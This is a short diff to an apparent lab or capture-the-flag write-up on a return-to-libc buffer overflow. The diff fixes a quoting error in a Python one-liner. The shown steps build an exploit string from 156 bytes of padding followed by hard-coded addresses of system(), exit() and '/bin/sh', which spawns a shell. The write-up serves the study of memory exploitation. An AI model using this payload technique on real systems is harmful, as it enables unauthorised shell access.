@@ -70,7 +70,7 @@ $2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
 ### Build exploit
 
 So we build our exploit string:
-1. 156 byte buffer - ```python -c "print 'A' * 156```
+1. 156 byte buffer - ```python -c "print 'A' * 156"```
 2. system() address - ```\xd0\xae\xe6\xf7```
 3. exit() address - ```\x70\xeb\xe5\xf7```
 4. "/bin/sh" address - ```\xec\x97\xf8\xf7```
